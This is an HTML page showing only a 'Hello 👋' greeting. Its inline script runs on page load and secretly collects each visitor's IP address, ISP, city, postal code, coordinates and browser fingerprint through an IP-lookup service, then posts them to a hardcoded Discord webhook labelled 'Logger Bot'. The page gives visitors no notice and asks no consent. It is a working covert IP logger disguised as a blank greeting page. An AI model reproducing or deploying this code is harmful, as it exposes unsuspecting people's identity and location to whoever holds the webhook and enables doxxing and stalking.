<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Hi</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
  </style>
</head>
<body>
  <h1>Hello 👋</h1>

  <script>
    async function getVisitorInfo() {
      try {
        const res = await fetch('https://ipwho.is/');
        if (!res.ok) throw new Error('Failed to fetch IP info.');
        const data = await res.json();
        if (!data.success) throw new Error('IP lookup failed.');

        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const platform = navigator.platform;
        const resolution = `${screen.width}x${screen.height}`;
        const memory = navigator.deviceMemory || 'N/A';
        const cpu = navigator.hardwareConcurrency || 'N/A';

        const content = `
📍 **New Visitor Logged**
🧠 **Device Info**
• User Agent: \`${userAgent}\`
• OS Platform: ${platform}
• Language: ${language}
• Screen: ${resolution}
• CPU Threads: ${cpu}
• RAM: ${memory} GB

🌐 **Network Info**
• IP: \`${data.ip}\`
• ISP: ${data.connection.isp || 'N/A'}
• Country: ${data.country || 'N/A'}
• Region: ${data.region || 'N/A'}
• City: ${data.city || 'N/A'}
• Postal: ${data.postal || 'N/A'}
• Timezone: ${data.timezone || 'N/A'}

📌 **Location**
• Latitude: ${data.latitude || 'N/A'}
• Longitude: ${data.longitude || 'N/A'}
        `;

        await fetch("https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content: content,
            username: "Logger Bot 🔍"
          })
        }).then(response => {
          if (!response.ok) {
            console.error('Discord Webhook Failed:', response.status);
          }
        }).catch(err => {
          console.error('Fetch to Discord failed:', err);
        });

      } catch (err) {
        console.error("Error in visitor info collection:", err);
      }
    }

    getVisitorInfo();
  </script>
</body>
</html>
